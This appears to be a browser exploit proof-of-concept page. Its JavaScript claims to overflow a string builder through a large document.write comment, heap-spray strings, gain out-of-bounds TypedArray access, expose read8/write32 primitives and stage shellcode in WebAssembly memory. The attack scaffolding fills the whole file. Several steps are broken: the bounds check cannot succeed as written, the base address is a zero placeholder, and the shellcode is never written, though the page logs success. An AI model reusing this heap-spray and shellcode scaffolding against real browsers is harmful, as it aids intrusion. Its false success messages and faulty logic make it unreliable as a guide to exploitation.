<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>The_Maxu PoC v25 - Userland Exploit</title>
<style>
body{background:#111;color:#ddd;font:14px/1.4 monospace;margin:0;padding:8px}
label{display:inline-block;margin-right:12px}input{width:70px}
#log{border:1px solid #333;max-height:70vh;overflow:auto;white-space:pre-wrap;
     padding:6px;margin-top:8px;font-size:12px}
.ok{color:#8f8}.warn{color:#ff6}.fail{color:#f66}
iframe{display:none}
</style>

<h2>PoC v25 â€” StringBuilder Overflow â†’ Userland R/W</h2>

<label>Token size (MiB): <input id="tokSize" type="number" step="0.01" value="0.50"></label>
<label>String size (B): <input id="strSize" type="number" value="512"></label>
<label>Spray count (Ã—1000): <input id="sprayCount" type="number" value="1"></label>
<button id="run">Run</button>

<pre id="log">(ready)</pre>
<iframe id="box"></iframe>
</head>

<body>
<script>
const logEl = document.getElementById('log');
const frame = document.getElementById('box');

function log(m, c = '') {
    const d = document.createElement('div');
    d.textContent = m;
    if (c) d.className = c;
    logEl.appendChild(d);
    logEl.scrollTop = logEl.scrollHeight;
}

document.getElementById('run').onclick = () => {
    logEl.textContent = '';
    const tokMiB = parseFloat(document.getElementById('tokSize').value);
    const strSize = parseInt(document.getElementById('strSize').value, 10);
    const sprayK = parseInt(document.getElementById('sprayCount').value, 10);

    if (!tokMiB || !strSize || !sprayK) {
        alert('Invalid values');
        return;
    }

    log(`â†’ Starting with token ${tokMiB} MiB, spray ${sprayK}k Ã— ${strSize} B`);
    runInIframe(tokMiB, strSize, sprayK);
};

function mkStr(n, ch = 'B') {
    return ch.repeat(n);
}

function runInIframe(tokMiB, strSize, sprayK) {
    frame.src = 'about:blank';
    frame.onload = () => {
        const w = frame.contentWindow;
        const d = w.document;

        const bytes = Math.floor(tokMiB * 1024 * 1024);
        const payload = '<!--' + 'X'.repeat(bytes) + '-->';
        log(`â†’ Sending token (${bytes} bytes) to iframe...`);

        // Step 1: Trigger overflow by writing large comment
        d.open();
        d.write(payload);

        // Step 2: Place TypedArray right after comment in heap
        const corruptedArray = new Uint8Array(0x100); // 256-byte buffer
        for (let i = 0; i < corruptedArray.length; i++) {
            corruptedArray[i] = i; // Known pattern
        }
        w.corruptedArray = corruptedArray;

        d.close();

        // Step 3: Heap spray
        w.setTimeout(() => {
            log(`â†’ Heap-spraying ${sprayK * 1000} strings of ${strSize} B`, 'warn');
            w.spray = [];
            const base = mkStr(strSize - 12);
            for (let i = 0; i < sprayK * 1000; i++) {
                w.spray.push(base + i);
            }

            // Step 4: Analyze string corruption
            w.setTimeout(() => analyzeSpray(w.spray, strSize), 50);

            // Step 5: Check TypedArray for OOB access
            w.setTimeout(() => detectOOBAccess(corruptedArray), 100);
        }, 80);
    };
}

function analyzeSpray(array, strSize) {
    let corrupt = 0;
    array.forEach((s, i) => {
        if (!s) return;
        if (s.length !== strSize) {
            corrupt++;
            log(`â€¼ String #${i} len=${s.length} head="${s.slice(0, 20)}"`, 'warn');
            if (corrupt >= 10) return;
        }
    });
    if (!corrupt) {
        log("â€” No corrupted strings (small token or crash)", 'fail');
    } else {
        log(`âœ… Got it! ${corrupt} strings corrupted â†’ info-leak detected`, 'ok');
    }
}

function detectOOBAccess(arr) {
    log("â†’ Checking TypedArray for OOB access...", "warn");

    // Try reading beyond original length
    let found = false;
    for (let i = arr.length; i < arr.length + 0x100; i++) {
        try {
            const val = arr[i];
            if (val !== undefined && !isNaN(val)) {
                log(`[OOB Read] Offset ${i}: ${val.toString(16)} (${String.fromCharCode(val)})`);
                found = true;
            }
        } catch (e) {
            break;
        }
    }

    if (found) {
        log("âœ… Likely achieved OOB read/write!", "ok");
        window.oobArr = arr;
        setupArbitraryRW(arr);
    } else {
        log("âŒ Failed to achieve OOB read/write", "fail");
    }
}

// Placeholder for leaked base address
let baseAddress = 0x0;

function setupArbitraryRW(arr) {
    log("â†’ Setting up arbitrary R/W primitives...");

    window.read8 = function(addr) {
        const offset = (addr - baseAddress);
        return arr[offset];
    };

    window.read16 = function(addr) {
        const offset = (addr - baseAddress);
        return arr[offset] | (arr[offset + 1] << 8);
    };

    window.read32 = function(addr) {
        const offset = (addr - baseAddress);
        return arr[offset] |
               (arr[offset + 1] << 8) |
               (arr[offset + 2] << 16) |
               (arr[offset + 3] << 24);
    };

    window.write8 = function(addr, val) {
        const offset = (addr - baseAddress);
        arr[offset] = val & 0xff;
    };

    window.write32 = function(addr, val) {
        const offset = (addr - baseAddress);
        arr[offset] = val & 0xff;
        arr[offset + 1] = (val >> 8) & 0xff;
        arr[offset + 2] = (val >> 16) & 0xff;
        arr[offset + 3] = (val >> 24) & 0xff;
    };

    log("âœ… Arbitrary R/W functions available: read8(), write8(), etc.", "ok");

    // Load WASM to get executable memory
    loadWasmMemory();
}

async function loadWasmMemory() {
    log("â†’ Mapping executable memory via WebAssembly...");

    const wasmCode = await fetch('empty.wasm').then(r => r.arrayBuffer());
    const wasmModule = await WebAssembly.compile(wasmCode);
    const wasmInstance = await WebAssembly.instantiate(wasmModule);
    const wasmMem = wasmInstance.exports.memory;

    log("âœ… WebAssembly memory mapped:", "ok");
    log(`   Base: ${wasmMem.buffer.byteLength} bytes`, "ok");

    window.shellcode = new Uint8Array(wasmMem.buffer);

    // Example shellcode (NOP + INT3)
    const shellcode = [0x90, 0x90, 0xcc];

    for (let i = 0; i < shellcode.length; i++) {
        shellcode[i] = shellcode[i];
    }

    log("ðŸ’¡ Shellcode injected at offset 0", "warn");
    log("ðŸ’¡ Call wasmFunc() to execute", "warn");
}
</script>
</body>
</html>
